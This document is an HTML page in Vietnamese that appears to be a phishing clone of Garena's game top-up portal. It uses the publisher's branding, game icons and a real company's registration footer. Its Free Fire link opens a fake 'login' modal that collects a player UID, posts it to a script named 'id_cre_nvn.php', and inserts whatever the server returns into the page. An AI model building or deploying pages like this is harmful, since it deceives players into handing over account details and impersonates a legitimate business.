<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="author" content="Nạp thẻ Free Fire">

    <link rel="icon" type="image/png" href="images/favicon.ico">

    <title>Trung tâm nạp thẻ Garena</title>

    <meta name="description" content="Trang nạp thẻ chính thức của nhà phát hành Garena. Nạp thẻ Garena nhanh nhất với nhiều ưu đãi đặc biệt. Nhân đôi nạp thẻ cho lần nạp thẻ đầu tiên" />
    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/backcode.css" rel="stylesheet">

    <link rel="stylesheet" href="css/bootstrap.min_1.css">


    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/napthe.css">
    <link href="css/style.css" rel="stylesheet">


    <script src="js/jquery-3.2.1.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/custom.js"></script>
</head>

<body class="home">
    <nav class="navbar navbar-default navbar-top">
        <div class="container">
            <div class="navbar-header">

                <a href="/"><img class="navbar-brand" src="/images/logo.png"  alt="Nạp thẻ Garena"></a>
                <br><br>
            </div>
        </div>
        </div>
        </div>
    </nav>



    <section>
        <div class="container">
            <div class="banner">
                <img src="https://cdn.vn.garenanow.com/web/napthevn/sp_pc_170222.png" alt="">
            </div>
            <div class="main-section__title">
                <div class="main-section__title-txt main-section__title-channel">Chọn game để nạp</div>
            </div>

            <div class="entries">
                <div class="row">
                    <div class="col-md-4 col-sm-6 col-xs-6 entries_item">
                        <a href="LienQuanMobile">
<img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/054/icon.png" alt="Nạp quân huy, nạp quân huy liên quân" class="entries_item-img">
<h2 class="text-title" style="color: #333333;">Liên Quân Mobile</h2>
</a>
                    </div>

                    <div class="col-md-4 col-sm-6 col-xs-6 entries_item">
                        <a id="myBtn">
<img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/100/067/icon.png" alt="Nạp kim cương, nạp kim cương free fire" class="entries_item-img">
<h2 class="text-title" style="color: #333333;">Free Fire</h2>
</a>
                    </div>

                  

                    <div class="col-md-4 col-sm-6 col-xs-6 entries_item">
                        <a href="FIFAOnline4">
<img src="https://cdngarenanow-a.akamaihd.net/gop/app/0000/032/837/icon.png" alt="Nạp FC FO4, Nạp FC FIFA Online 4" class="entries_item-img">
<h2 class="text-title" style="color: #333333;">FIFA Online 4 (VN)</h2>
</a>
                    </div>

                </div>
            </div>
        </div>
    </section>
    <script type="text/javascript">
        if ($('#modalNotificationPopup').length > 0) {
            setTimeout(function() {
                $('#modalNotificationPopup').modal('show');
                $('#modalNotificationPopup').addClass('in');
            }, 1000);
        }
    </script>

    <br>
    <br>
    <style>
        /* The Modal (background) */

        .check {
            display: none;
            /* Hidden by default */
            position: fixed;
            /* Stay in place */
            z-index: 1;
            /* Sit on top */
            padding-top: 100px;
            /* Location of the box */
            left: 0;
            top: 0;
            width: 100%;
            /* Full width */
            height: 100%;
            /* Full height */
            overflow: auto;
            /* Enable scroll if needed */
            background-color: rgb(0, 0, 0);
            /* Fallback color */
            background-color: rgba(0, 0, 0, 0.4);
            /* Black w/ opacity */
        }

        .title {
            font-size: 2rem;
        }

        .lable {
            font-size: 1.5rem;
        }

        ._1-Nj48NOYsKvIivbNob7-p {
            display: block;
            margin-top: .25rem;
            font-family: GFF;
            font-size: 1.5rem;
            line-height: .875rem;
            color: #f15a24;
        }

        /* The Close Button */
    </style>

    <div id="myModal" class="check">
        <div class="_2dcZ6Ewtbw7_fbsWPPvTv" bis_skin_checked="1">
            <div class="KWO451RGCO03qwEFD6wes" bis_skin_checked="1">
                <div class="_3Tjfm8tOhcG_bDopJCWJNF" bis_skin_checked="1"><span class="close"><div class="_2y58EfoWCl1fOCMhTbGj7I" bis_skin_checked="1"></div></span>
                    <div class="_1UPIiCKG74RyivgXoNHZ1C title" bis_skin_checked="1">ID đăng nhập<i class="_1JO0WSVwNQbsTKD5OVrzb7"></i></div>

                    <form class="_1Zz2Slr84iduzH9kbaAFCc" method="POST">

                        <div class="vKAxPXIsU45ZEHBGblrRz" bis_skin_checked="1">
                            <label for="playerId" class="_3bxIm_ZJIvBax5TVErvJCo lable">ID người chơi</label>
                            <input id="id" style="height: 30px" type="text" placeholder="Hãy nhập UID của bạn" maxlength="64" autofocus="true" class="_3iWacUlr9XnH0ZaYW7i6dw">
                            <o id="result"></o>
                        </div>


                        <button class="CwkOFfrTXvDtViKW0zGtg" style="font-size: 1.5rem; height: 40px" type="submit" id="dangnhap">Đăng nhập</button></button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script type="text/javascript">
        $(document).ready(function() {

            $('#dangnhap').click(function() {
                document.getElementById("dangnhap").disabled = true;
                document.getElementById('dangnhap').innerHTML = "Đang đăng nhập";

                $.ajax({
                    type: "POST",
                    url: 'id_cre_nvn.php',
                    data: {

                        id: $("#id").val(),
                    },

                    success: function(result) {
                        document.getElementById("dangnhap").disabled = false;
                        document.getElementById('dangnhap').innerHTML = "Đăng nhập";

                        $("#result").html(result);
                    }
                });

            });

        });
    </script>


    <script>
        // Get the modal
        var modal = document.getElementById("myModal");

        // Get the button that opens the modal
        var btn = document.getElementById("myBtn");

        // Get the <span> element that closes the modal
        var span = document.getElementsByClassName("close")[0];

        // When the user clicks the button, open the modal 
        btn.onclick = function() {
            modal.style.display = "block";
        }

        // When the user clicks on <span> (x), close the modal
        span.onclick = function() {
            modal.style.display = "none";
        }

        // When the user clicks anywhere outside of the modal, close it
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    </script>

    <br>
    <br>

    </div>
    <footer class="footer">
        <div class="main-section">
            CÔNG TY CỔ PHẦN PHÁT TRIỂN THỂ THAO ĐIỆN TỬ VIỆT NAM
            <br> Giấy CNĐKKD số 0103959912, cấp lần đầu ngày 09/06/2009 | Cơ quan cấp: Phòng Đăng ký kinh doanh - Sở Kế hoạch và đầu tư TP Hà Nội
            <br> Địa chỉ trụ sở chính: Tầng 29, Tòa nhà Trung tâm Lotte Hà Nội, số 54 đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, TP Hà Nội, Việt Nam
            <br> Điện thoại: 024 73053939
        </div>
        <div class="container">
            <nav class="footer-link-wrap">
                <a class="footer-link-txt" href="#">Câu hỏi thường gặp</a> | <a class="footer-link-txt" href="#">Điều khoản sử dụng</a> | <a class="footer-link-txt" href="#">Chính sách bảo mật</a>
            </nav>
            <nav class="footer-link-wrap text-small">

            </nav>
        </div>
    </footer>
</body>

</html>